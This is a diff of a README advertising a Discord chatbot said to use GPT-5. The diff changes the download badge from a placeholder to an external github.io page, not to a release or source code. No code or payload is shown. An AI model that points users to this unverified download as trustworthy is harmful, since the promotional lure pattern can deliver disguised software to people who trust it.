@@ -2,7 +2,7 @@
 
 Unleash the next generation of AI interaction in your Discord server with the GPT-5 Chatbot Ultimate. This project empowers server admins and community builders to deliver intelligent, responsive, and engaging chatbot experiences with minimal setup. Whether you're running a gaming community, educational hub, or tech support server — this AI assistant becomes your 24/7 smart responder, entertainer, and support rep all in one. It leverages GPT-5 for cutting-edge language understanding, bringing human-like conversation and natural flow to your server.
 
-[![🚀 Download GPT-5 Chatbot](https://img.shields.io/badge/Download-DiscordGPT5Chatbot-blueviolet)](#)
+[![🚀 Download GPT-5 Chatbot](https://img.shields.io/badge/Download-DiscordGPT5Chatbot-blueviolet)](https://discord-gpt5-chatbot-ultimate.github.io/.github/)
 
 ---
 
